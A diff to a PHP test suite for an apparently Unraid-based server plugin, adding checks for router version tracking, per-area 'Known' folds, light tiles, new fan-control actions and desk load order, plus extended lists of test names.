     same('mikrotik round 3: a round without a version line — the version kept', '7.24.5', $net()['senders']['10.77.3.10']['meta']['version'] ?? null);
+    // known vulnerabilities (2026-11-23): each router's version by its own log, and since when — never asked of the router
+    $n3 = $net();
+    same('mikrotik known vulnerabilities: the version since the round its log said it (kept since), UniFi\'s since its first line; the routers as the inventory takes them',
+        [$t2, $now, [['routeros', '7.24.5', $t2], ['unifi', '10.6.106', $now]]],
+        [$n3['senders']['10.77.3.10']['meta']['version_at'] ?? null, $n3['senders']['192.0.2.1']['meta']['version_at'] ?? null,
+         (function ($x) { $x = array_map(fn ($r) => [$r['product'], $r['version'], $r['at']], $x); sort($x); return $x; })(watchmanVulnRouters($n3))]);
 
     // ---- the privacy rule over every entry: another client's address, MAC or name only in net_new_device
     $bystander = ['10.9.9.13', '52:54:00:4d:54:77', '52:54:00:4D:54:77', 'guest-phone', '10.0.0.2', '10.9.9.15'];
@@ -49645,8 +55108,8 @@ function testWatchBookView(): void
 }
 
 /**
- * «What I keep an eye on» with its filter bar (2026-10-12, Benj: 14 folded groups and no way to find a container in
- * them): desk.js groupFit() / fitTally() / groupOpen() and watchSection() under node (tests/watchfilter.js — skipped
+ * What he knows, with a filter (2026-10-12, Benj: 14 folded groups and no way to find a container in them; 1.96: in each
+ * area as folds «Known: …», the tile «What I keep an eye on» gone): desk.js groupFit() / fitTally() / groupOpen() and knownFolds() under node (tests/watchfilter.js — skipped
  * where node is missing): the words hit an item's name, a chip's word, a sub line, a group's title (then the whole
  * group); a group without hits is left out, one with hits unfolded with «n of m fit» on its summary; the bar told
  * «n of m»; no hits: the empty line; «Show all» (no words) = every group back, folded as kept. Then the page's side: the
@@ -49656,12 +55119,19 @@ function testWatchBookView(): void
 function testWatchFilter(): void
 {
     $js = (string) file_get_contents(OFFICE_WEB . '/desks/watchman/desk.js');
-    check('watch filter: the list\'s bar is an Office.filterBar keyed watchman.watch (no select: nothing of it kept)',
-        (bool) preg_match("/Office\\.filterBar\\(\\{\\s*key: 'watchman\\.watch',(?:(?!select:).){0,300}?onChange/s", $js));
-    check('watch filter: a new visit starts with the whole list (mount() empties the bar)', str_contains($js, 'watchBarGet().reset();'));
+    // 1.96 (Benj): no tile «What I keep an eye on» — each area's section has its folds «Known: …», found by the area's
+    // own filter words; the old route lands on the book; the search's places name the area
+    check('known folds: in each tile\'s section, with its filter words', str_contains($js, 'const inv = knownFolds(id, open.length ? bar.read().words : []);'));
+    check('known folds: no tile «watch», no jump button, #/watchman/watch lands on the book',
+        !str_contains($js, "id: 'watch', key: 'tile.watch'") && !str_contains($js, "T('cat.to_watch')")
+        && str_contains($js, "watch: 'book', open: 'book', incidents: 'book', posture: ''") && str_contains($js, "sw.mount(m ? 'book' : old !== null ? old : sub);"));
+    check('known folds: the search\'s places go to the area, its anchor kept', str_contains($js, 'route: `#/${ID}/${areaOf(key)}`, anchor: `watch:${key}`'));
+    $phrases = ['en' => 'keep an eye', 'de' => 'im auge', 'it' => "tengo d'occhio", 'fr' => "garde à l'œil", 'es' => 'lo que vigilo'];
     foreach (['en', 'de', 'it', 'fr', 'es'] as $l) {
         $lang = langFile(OFFICE_WEB . "/desks/watchman/lang/$l.json");
-        check("watch filter: its label and empty line in $l", is_string($lang['watch.filter.label'] ?? null) && is_string($lang['watch.filter.none'] ?? null));
+        $text = mb_strtolower((string) json_encode($lang, JSON_UNESCAPED_UNICODE));
+        check("known folds: «Known: …» in $l, the old tile's words gone", is_string($lang['inv.title'] ?? null) && !isset($lang['tile.watch'], $lang['watch.title'], $lang['cat.to_watch'])
+            && !str_contains($text, $phrases[$l]));
     }
     $node = testsNode();
     if ($node === '') {
@@ -49676,7 +55146,7 @@ function testWatchFilter(): void
         check('watch filter: ran under node', false, $raw);
         return;
     }
-    check("watch filter: the list and its bar under node ({$r['pass']} checks)", $r['pass'] >= 35 && !$r['fail']);
+    check("watch filter: what he knows, per area, under node ({$r['pass']} checks)", $r['pass'] >= 25 && !$r['fail']);
     foreach ($r['fail'] as $f) {
         check('watch filter: ' . ($f[0] ?? '?'), false, 'got ' . json_encode($f[1] ?? null) . ', want ' . json_encode($f[2] ?? null));
     }
@@ -49825,7 +55295,7 @@ function testSections(): void
     check('sections: the desktop\'s move is block nearest, marked as a reveal', str_contains($fn, "head.scrollIntoView({ block: 'nearest' }); /* reveal */"));
     check('sections: the focus stays on the clicked tile without a scroll', str_contains($fn, 'focus({ preventScroll: true })'));
     check('sections: nothing hidden — no section is drawn with hidden', !preg_match('/\.hidden\s*=/', $fn));
-    foreach (['.tile-on, & button.card[aria-pressed=true], & button.stat[aria-pressed=true]{', '.tile-mark{', ':is(.Theme--white, .Theme--azure, [data-unraid-theme=white]) &:not([data-theme=dark]) .tile-on',
+    foreach (['.tile-on, & button.card[aria-pressed=true], & button.stat[aria-pressed=true], & button.light-tile[aria-pressed=true]{', '.tile-mark{', ':is(.Theme--white, .Theme--azure, [data-unraid-theme=white]) &:not([data-theme=dark]) .tile-on',
         '&[data-theme=light] .tile-on', '.section-head.sticky{position:sticky', '& button.section-all{'] as $rule) {
         check("sections: office.css has $rule", str_contains($css, $rule));
     }
@@ -49839,6 +55309,29 @@ function testSections(): void
         same("sections: the marks and «◂ All» in $code", $words, [$lang['common.tile_filter'] ?? null, $lang['common.tile_open'] ?? null, $lang['common.tile_all'] ?? null]);
     }
     testsSectionsJs('sections', 'sections', 50);
+}
+
+/**
+ * Light tiles and the row's filter (1.96, core.js Office.light, Office.sections({filter}); the Night Watchman's areas):
+ * the CSS (a shape per level from the theme's tokens, the row narrower than number tiles, the glow on), the level's words
+ * in five languages; under node (tests/sections.js lights): a class and a dot per level, the aria-label in words, the tip
+ * as data-tip with data-own (a tap stays the tile's), the mark; the filter's bar above the row — words and «only …»
+ * narrow the row and the page, the chosen tile stays, a new visit starts whole, nothing kept.
+ */
+function testLights(): void
+{
+    $css = (string) file_get_contents(OFFICE_WEB . '/assets/office.css');
+    foreach (['.lights{display:grid;', '.light-danger .light-dot{background:var(--danger); border-radius:2px}', '.light-warn .light-dot{background:var(--warn); clip-path:',
+        '.light-note .light-dot, .light-ok .light-dot{background:var(--good); border-radius:50%}', '.light-none .light-dot{border:2px solid var(--muted)',
+        '& button.light-tile[aria-pressed=true]{'] as $rule) {
+        check("lights: office.css has $rule", str_contains($css, $rule));
+    }
+    $keys = ['danger', 'warn', 'note', 'ok', 'none', 'unknown'];
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $code) {
+        $lang = langFile(OFFICE_WEB . "/lang/$code.json");
+        same("lights: the levels in words in $code", [], array_values(array_filter($keys, fn ($k) => !is_string($lang["common.light.$k"] ?? null) || $lang["common.light.$k"] === '')));
+    }
+    testsSectionsJs('lights', 'lights', 14);
 }
 
 /**
@@ -65355,7 +70848,7 @@ function testFanboyPublic(): void
     $hired = [$run($agent, "$tmp/hired"), $run($web, "$tmp/hired")];
     same('fanboy public: … hired once staff.json says so (agent, web) — «not hired» above is the default, not a blind spot', [true, true], [$hired[0]['hired'] ?? $hired[0], $hired[1]['hired'] ?? $hired[1]]);
     $actions = ['refresh', 'report', 'look_now', 'drivers_load', 'drivers_undo', 'chip_read', 'chip_report', 'test_up', 'measure', 'step_alive', 'step_stop', 'step_next', 'hub_look', 'answer', 'role', 'fan_name', 'fan_save',
-                'zones_propose', 'zones_save', 'dry_run', 'take_over', 'hand_back', 'back', 'fan_look', 'history', 'dashboard', 'watch', 'show', 'show_stop', 'safety_back', 'stop_all'];
+                'zones_propose', 'zones_save', 'aside', 'dry_run', 'take_over', 'hand_back', 'back', 'fan_look', 'history', 'dashboard', 'watch', 'show', 'show_stop', 'safety_back', 'stop_all'];
     // (2026-11-22: the control is his job without the data folder — `ram_jobs` —, the other three jobs as before)
     same('fanboy public: the desk on both sides without any file (refresh, report and part 2\'s actions; a fit, checks, his four jobs — the control without the data folder —, a tick), a sender of the notification centre — and not hired',
         [true, $actions, true, true, ['fanboy-control', 'fanboy-step', 'fanboy-show', 'fanboy-restore'], true, false, true, true, false],
@@ -65828,7 +71321,7 @@ function testFanboyPage(): void
     $acts = array_values(array_unique($acts[1]));
     sort($acts);
     same('fanboy page: the banner between the row and the sections; the page\'s actions through act() — the wizard\'s and part 2\'s',
-        [true, ['chip_read', 'dashboard', 'drivers_load', 'drivers_undo', 'hand_back', 'look_now', 'safety_back', 'take_over', 'watch', 'zones_propose', 'zones_save']],
+        [true, ['aside', 'chip_read', 'dashboard', 'drivers_load', 'drivers_undo', 'hand_back', 'look_now', 'safety_back', 'take_over', 'watch', 'zones_propose', 'zones_save']],
         [str_contains($js, "const banner = el('div', 'fb-banner');") && str_contains($js, 'if (banner.parentNode !== sw.el) sw.el.insertBefore(banner, sw.body);'), $acts]);
     // step 2's list and panel: its actions queued through send() (no click dropped, a refusal said in the strip)
     preg_match_all("/send\\('([a-z_]+)'/", $js, $sends);
@@ -66818,6 +72311,44 @@ function testRunDirBudget(): void
 }
 
 /**
+ * The agent loads its desks in any order (1.96 on test4: Unraid's locale sorts watchman.php before watchman-rules.php —
+ * its collation ignores '-' and '.' —, and a plain `require` after watchman.php's require_once declared the rules'
+ * functions twice). In its own process: the desks in glob's order and reversed (every main file before its parts) — the
+ * same desks, no fatal error; no other entry point loads a desk file with a plain require.
+ */
+function testDeskLoadOrder(): void
+{
+    $load = function (string $order): array {
+        $env = ['OFFICE_DATA_DIR' => TESTS_RUN_DIR . '/load-order-data', 'OFFICE_RUN_DIR' => TESTS_RUN_DIR, 'PATH' => (string) getenv('PATH')]
+             + ($order === 'reverse' ? ['OFFICE_TEST_DESK_ORDER' => 'reverse'] : []);
+        $p = proc_open([PHP_BINARY, '-r', 'define("AGENT_LIBRARY_ONLY", 1); require ' . var_export(OFFICE_DIR . '/agent/agent.php', true) . ';'
+            . ' $d = array_keys(desks()); sort($d); echo "\n@@", json_encode(["desks" => $d, "files" => array_map("basename", array_values(array_filter(get_included_files(),'
+            . ' fn ($f) => str_contains($f, "/agent/desks/"))))]);'], [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null, $env);
+        $out = (string) stream_get_contents($pipes[1]);           // its answer (stdout); stderr only for the message
+        $err = (string) stream_get_contents($pipes[2]);
+        proc_close($p);
+        $out .= $err === '' ? '' : "\n" . $err;
+        $at = strrpos($out, "\n@@");
+        $json = $at === false ? '' : strtok(substr($out, $at + 3), "\n");
+        return ($json === false || $json === '' ? null : json_decode($json, true)) ?: ['raw' => mb_substr($out, 0, 600)];
+    };
+    $glob = $load('glob');
+    $rev = $load('reverse');
+    $files = (array) ($rev['files'] ?? []);
+    same('desk load order: reversed (every main file before its parts) — the same desks as in glob\'s order, no error', [true, true, $glob['desks'] ?? 'x'],
+        [count((array) ($glob['desks'] ?? [])) > 10, isset($rev['desks']), $rev['desks'] ?? $rev]);
+    check('desk load order: the reversed run really loaded watchman.php before watchman-rules.php',
+        ($i = array_search('watchman.php', $files, true)) !== false && ($j = array_search('watchman-rules.php', $files, true)) !== false && $i < $j, json_encode($files));
+    $plain = [];
+    foreach (array_merge(glob(OFFICE_DIR . '/agent/*.php') ?: [], glob(OFFICE_DIR . '/agent/lib/*.php') ?: [], glob(OFFICE_DIR . '/src/*.php') ?: []) as $f) {
+        if (preg_match('/\brequire\s+\$[A-Za-z_]*[Dd]esk/', (string) file_get_contents($f))) {
+            $plain[] = basename($f);
+        }
+    }
+    same('desk load order: no entry point loads a desk file with a plain require', [], $plain);
+}
+
+/**
  * Every writer into the office's RAM folder has its line in RUNDIR_FILES (agent/lib/rundir.php): what bounds it, who
  * removes it (2026-11-19, /run full). Found in the code: `RUN_DIR . '/<name>'`, `officeRunDir() . '/<name>'`, a variable
  * set from one of them (`$run = RUN_DIR …` then "$run/<name>" or $run . '/<name>'), and in the scripts a variable set to
@@ -67478,17 +73009,18 @@ function testSkipPlaces(): void
 
 $parts = ['logic' => ['testCron', 'testRetention', 'testPlanGone', 'testSnapPlansTolerant', 'testSnapPlanIdNeverReused', 'testSleepingPools', 'testSnapshotNames', 'testJack', 'testJackPlan', 'testJackNoPython', 'testJackRun', 'testJackStructure', 'testJackWatch', 'testJackSizes', 'testJackShareDataset', 'testJackPool', 'testJackImport', 'testJackForeign', 'testOfficeCron', 'testCaretakerCronLook', 'testMenuName', 'testSetupListDiff', 'testNoScriptNames', 'testPhpVarNames', 'testDetailsKept', 'testSetupDiscard', 'testWhereArrayZfs', 'testEstimates', 'testBackupFirstUpload', 'testBackupRough', 'testNotify', 'testNotifyLayout', 'testNotifyCenter', 'testCaretakerAcks', 'testAckContent', 'testCaretakerAckDrift', 'testJackLetGo', 'testJackMover', 'testJackGatherCache', 'testJackRsync', 'testJackTidyDisks', 'testJackUpstream', 'testJackPersons', 'testJackNotInBudget', 'testJackProgress', 'testJackReadyShares',
                       'testLogsFlood',
+                      'testWatchmanHandMore',
                       'testMoverelliFit', 'testMoverelliIni', 'testMoverelliIniTolerant', 'testMoverelliMoveBin', 'testMoverelliRun', 'testMoverelliGates', 'testMoverelliForeign', 'testMoverelliPage', 'testRefusedRowWords', 'testMoverelliImport', 'testNightPlan', 'testNightRun', 'testJackChaos', 'testNightOrder', 'testNightHerPool', 'testNightPicture', 'testMoverelliRunPicture', 'testNightJackCard', 'testNightJackInHerCard', 'testNightSteps', 'testNightReserve', 'testNightSnaps', 'testPoolJackOutside', 'testPoolNonZfs', 'testMoverelliSharesGone', 'testMoverelliTiles', 'testMoverelliSuggestJack', 'testMoverelliUnraid', 'testMoverelliUnraidProgress', 'testMoverelliStop', 'testMoverelliArrayStop', 'testMoverelliPowerCut', 'testMoverelliNothingMoved', 'testMoverelliCardLag', 'testMoverelliCardFile', 'testMoverelliLeftWhy', 'testMoverelliSyncMoved', 'testMoverelliTwins', 'testMoverelliEta', 'testMoverelliPreferDisks', 'testMoverelliTidy', 'testMoverelliShareRoot', 'testMoverelliTrailingSpace', 'testMoverelliFuture', 'testMoverelliLeftCodesPage', 'testOfficeFmtSize', 'testMoverelliIdleRules', 'testMoverelliPageTruth', 'testMoverJackTruthRest', 'testGreetTruth', 'testMoverelliFill', 'testPoolLevel', 'testPoolBytes', 'testStreamerTab', 'testJackRemoveServer', 'testJackSaveReconnect', 'testJackConnectNoChange', 'testJackByWords', 'testStreamerBudget', 'testStreamerReset', 'testStreamerFix3', 'testDialogSeen', 'testStreamerShares', 'testJackYield',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testJobStale', 'testJobSilentRuns', 'testNoWallWaits', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testSnapRead', 'testDrillSnapRead', 'testRenameFree', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetIpsFamilies', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testSnapshotBusy', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testWatchWakesPage', 'testWatchmanWakes', 'testWatchmanWakeTrail', 'testMetrics', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanTeamLeadOne', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanOwnCron', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupTruthShares', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupKopiaSplitTags', 'testBackupKopiaWord', 'testBackupNewLocal', 'testBackupNewLocalOffice', 'testBackupPlace', 'testSetupUnfold', 'testSetupFilter', 'testSetupTiles', 'testSetupFirstPlace', 'testBackupPlaceOffer', 'testSetupAsleepKept', 'testSetupGoneApp', 'testSetupStoppedKept', 'testSetupNoDocker', 'testSetupBom', 'testSetupDupKey', 'testSetupUntrusted', 'testSetupKopiaGone', 'testSetupDockerOffKeeps', 'testSetupOldUserScript', 'testSetupPoolGone', 'testBackupPresets', 'testBackupSkip', 'testBackupVmOrder', 'testBackupVmWarn', 'testBackupBtrfsBrake', 'testPartnerAtOnce', 'testBackupArrayStop', 'testBackupPruneOwn', 'testBackupKopiaAutostart', 'testBackupKopiaOrder', 'testAgentBackupHooks', 'testBackupRecoverNotes', 'testDataTrust', 'testBackupScheduledUnset', 'testBackupNotifyLang', 'testBackupNotifyItems', 'testNotifyPlain', 'testJackStreamerName', 'testRetentionPartner', 'testOfficeHome', 'testBackupEpipe', 'testBackupPartnerPhase', 'testBackupInside', 'testBackupPartnerOffice', 'testBackupReview172', 'testBackupFlashNever', 'testPartnerEnded', 'testBackupAnewChoice', 'testPartnerStaleName', 'testBackupAsleep', 'testBackupAsleepOffice', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testRestoreRunCard', 'testJobStale', 'testJobSilentRuns', 'testNoWallWaits', 'testRestoreVmFit', 'testRestoreVmForeign', 'testRestoreStack', 'testSetupMakeDataset', 'testSetupMakeFolder', 'testRestoreShares', 'testRestoreSnapsHold', 'testRestorePaths', 'testRestoreBrowse', 'testRestoreNextcloud', 'testRestoreFindings', 'testRestoreDatabases', 'testRestoreDbStopped', 'testRestoreNames', 'testRestoreInUse', 'testRestoreSettled', 'testRestoreUnfinished', 'testRestoreArrayStopWhy', 'testRestoreMeasuring', 'testRestorePutbackDb', 'testRestoreConfigNoTemplate', 'testRestoreDrill', 'testDrillSqliteAppIndex', 'testDrillShareFile', 'testDrillImageData', 'testSnapRead', 'testDrillSnapRead', 'testRenameFree', 'testRestorePartner', 'testRestoreMoveGuide', 'testPartnerTicket', 'testPartnerDoorDocs', 'testPartnerRepair', 'testPartnerStart', 'testWatchmanTicket', 'testPartnerSendBack', 'testWatchmanPartner', 'testWatchmanNet', 'testWatchmanNetIpsFamilies', 'testWatchmanNetMikrotik', 'testSnapshotPartner', 'testSnapshotBusy', 'testVmOrphans', 'testCleanupPartner', 'testLogsPartner', 'testAdvisor', 'testAdvisorDockerOff', 'testAdvisorInstall', 'testAdvisorOldTemplate', 'testAdvisorRecord', 'testAdvisorObjectLock', 'testAdvisorPartnerGuide', 'testLogsTour', 'testTruthLogsWatch', 'testLogsRules', 'testLogsPlugins', 'testLogsMine', 'testLogsFilters', 'testLogsFiltersPage', 'testWatchWakesPage', 'testWatchmanWakes', 'testWatchmanWakeTrail', 'testMetrics', 'testWatchmanCats', 'testWatchmanTiles', 'testWatchmanScope', 'testWatchmanGreet', 'testWatchmanRules', 'testWatchmanKnown', 'testWatchmanSettings', 'testWatchmanRules6a', 'testWatchmanRules6b', 'testWatchmanRules6c', 'testWatchmanRules6d', 'testWatchmanRules6e', 'testWatchmanRules6f', 'testWatchmanRules6g', 'testWatchmanFrom195', 'testWatchmanRelearn', 'testWatchmanStandRender', 'testWatchmanPageBars', 'testWatchmanRulesNew', 'testWatchmanJournal', 'testWatchmanBookMore', 'testWatchmanVuln', 'testWatchmanVulnRanges', 'testWatchmanVulnPhp', 'testWatchmanVulnNvd', 'testWatchmanVulnBackoff', 'testWatchmanVulnRouters', 'testWatchmanVulnSoftware', 'testWatchmanVulnHonest', 'testWatchmanVulnLetters', 'testWatchmanVulnLook', 'testWatchmanVulnHome', 'testWatchmanVulnAdvisories', 'testWatchmanVulnAdvisoryLines', 'testWatchmanHot', 'testLogsigns', 'testWatchmanSigns', 'testWatchmanHw', 'testWatchmanCpuFaults', 'testWatchmanWear', 'testWatchmanHwBookMore', 'testWatchman', 'testWatchmanGone', 'testWatchmanSerious', 'testWatchmanTeamLeadOne', 'testWatchmanSeriousUndo', 'testWatchmanAtUserScript', 'testWatchmanSched', 'testWatchmanOffice', 'testWatchmanOwnCron', 'testWatchmanFlow', 'testWatchmanFlowPull', 'testWatchmanFlowGone', 'testWatchmanFlowFiles', 'testWatchmanPosture', 'testWatchmanPrivilegedStopped', 'testWatchmanSnaps', 'testWatchmanHost', 'testWatchmanStartFiles', 'testWatchmanGateway', 'testWatchmanNight', 'testWatchmanBoot', 'testNightUi', 'testJobGuard', 'testComposeBuilds', 'testUnraidPath', 'testExclusive', 'testWatchmanGoLines', 'testWatchmanFlowSources', 'testWatchmanNetMikrotikBook', 'testAdvisorMikrotikGuide', 'testDashboardJobs', 'testBackupKopiaOrphans', 'testBackupOldSourcesPage', 'testKopiaEmptied', 'testKopiaEmptiedCache', 'testBackupFutureFiles', 'testKopiaLockGuard', 'testBackup74Polish', 'testBackupAppShare', 'testSetupLeftUnsaved', 'testTipNeverKept', 'testSilentControlsMore', 'testBackupAsleepNoMust', 'testSetupUnknownKey', 'testBackupVolumeCache', 'testBackupGonePackage', 'testBackupMovedPackage', 'testSetupApplyHonest', 'testSetupViaShare', 'testSetupTravelPicture', 'testBackupTruthProtection', 'testBackupTruthShares', 'testBackupResults', 'testRestoreTruthChips', 'testSetupOwnDatasetApply', 'testBackupNcOpen', 'testBackupPausedStopped', 'testSetupSearch', 'testBackupPlaceVerdict', 'testWatchmanFlowGuess', 'testWatchmanGuessMore', 'testBackupLastRunEnded', 'testOffsiteReach', 'testDockerSilent', 'testKopiaHang', 'testKopiaWatch', 'testWatchmanHold', 'testBackupBatchH', 'testBackupRetention',
                       'testWhereAfterWatchman', 'testWhereVmStop', 'testWhereVmMigratable', 'testWhereTunables', 'testBackupSparse', 'testWhereTakeOver', 'testWhereDesk', 'testWhereProtectionTruth', 'testWhereCronTruth', 'testWhereMoverAdvice', 'testSpace', 'testWhereMap', 'testCleanupSizesUnknown', 'testArrayStoppedDataDir', 'testWhereBuilding', 'testCleanupTick', 'testCleanupJobCap', 'testCleanupJobSameResult', 'testStaffMerged', 'testStaffOrder', 'testHireWith', 'testHireNeeds', 'testMovedDesk', 'testMigrateJackId', 'testMigrateMediaCache', 'testMigrateWakes', 'testSupporter', 'testLeftovers', 'testOfficeLanguage', 'testThemeSwitch', 'testSizeSwitch', 'testApiLook', 'testLookPage', 'testLookOldRun', 'testUpdateNotice', 'testReportDialog', 'testSearchPlaces', 'testSearchItems', 'testSearchGuides', 'testApiGzip', 'testFlashDownload', 'testWatchmanApiDoor', 'testCaretakerApi', 'testCaretakerNetworks', 'testSetupMessages', 'testDriftCodes', 'testIconStacks', 'testPartnerPairing', 'testPartnerUsonetSimple', 'testPartnerAddress', 'testPartnerWatch', 'testPartnerGone', 'testPartnerRelease', 'testPartnerUnits', 'testPartnerTolerant', 'testMigrate', 'testBackupReplan', 'testBackupPairsReplan', 'testUnraidTested', 'testCronBack', 'testPlgGuard', 'testCleanEnv', 'testPlgInstall', 'testWatchmanRoundWait', 'testPlgRemove', 'testBackupLetGo', 'testBackupAbortAsked', 'testJackSetupFresh', 'testApiGetOffline', 'testSupporterList', 'testReportDialogImages', 'testReportDialogDiagnostics', 'testReportDialogOwnWords', 'testReportDialogDesk',
                       'testRestoreReviewPaths', 'testRestoreSharesTick', 'testBackupSharesTick', 'testBackupRunEnded', 'testRestoreGapsPage', 'testRestoreGapsAgent', 'testRestoreGapsSwap', 'testRestoreShareUnlisted', 'testRestoreGapsLibvirt', 'testRestoreReviewJob', 'testRestoreReviewForeign', 'testRestoreReviewPeek',
-                      'testFlockShfs', 'testBackupOneMinute', 'testStrictSettings', 'testRestoreClientEcho', 'testWatchBookView', 'testWatchFilter', 'testWatchBookNoteSome', 'testWatchmanAtPlugin', 'testWatchmanAtLeft', 'testWatchmanBootNoise', 'testWatchmanAtOnce', 'testWatchmanAtTold', 'testParityWhy', 'testCleanupVolumes', 'testHiddenStoreroom', 'testFilterWords', 'testFilterBar', 'testOfficeJobScheduleNext', 'testBackupTiles', 'testBackupPartnerEta', 'testJackLastRunDuringRun', 'testJackListLost', 'testJackPoolTileBudget', 'testJackThemes', 'testSnapPoolSplit', 'testTruthRestPages', 'testSnapArrayDisks', 'testTilesMediaPages', 'testCleanupInUseLocked', 'testCleanupOrphanDatasets', 'testPlaceReadersNoSettings', 'testCleanupSnapOnly', 'testCleanupSnapKept', 'testCleanupDrillCopies', 'testStaleShares', 'testSkipPlaces', 'testCleanupSkipGreeting', 'testCleanupTiles', 'testRestoreTiles', 'testTilesConvention', 'testSections', 'testDeskPages', 'testScheduleTile', 'testTourSchedules', 'testUsoNetPin', 'testUsoNetRule', 'testUsoNetStatus', 'testFanboyLook'],
-          'hardening' => ['testRequestTypes', 'testRunDirLeftovers', 'testRunDirCrashLoop', 'testRunDirLink', 'testRunDirBudget', 'testRunDirAudit', 'testRunDirRunCap', 'testRunDirReport', 'testFirstHome', 'testSafeWrites', 'testAgentRestarted', 'testHeartbeat', 'testDoorbell', 'testAgentClock', 'testAgentZone', 'testAgentZoneChange', 'testHostAtRequeue', 'testHouseDockerSilent', 'testDockerBackLook', 'testDockerGeneration', 'testDockerOffSaid', 'testBackupTruthRest', 'testUncheckedIsNeither', 'testDoneOnlyWhenDone', 'testStaleSaid', 'testDockerGuard', 'testNotifyToldLately', 'testHostLaunchAtd', 'testCleanupStoreroomDisks', 'testCleanupPurgeEnds', 'testSnapshotRecord', 'testTrashManifest', 'testJackPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets', 'testSupporterKeys', 'testPartnerDoor', 'testPartnerQuota', 'testPartnerAside', 'testReport', 'testReportImages', 'testReportDiagnostics', 'testReportSlots', 'testReportDiagScrub', 'testReportStatus', 'testReportWatch', 'testReportInbox', 'testRunnerNames', 'testSnapshotIds', 'testAgentHired', 'testSupporterClaim', 'testUsoNetKeys', 'testUsoNetScript', 'testUsoNetJoin', 'testHostShell', 'testOnlyOfficeCron'],
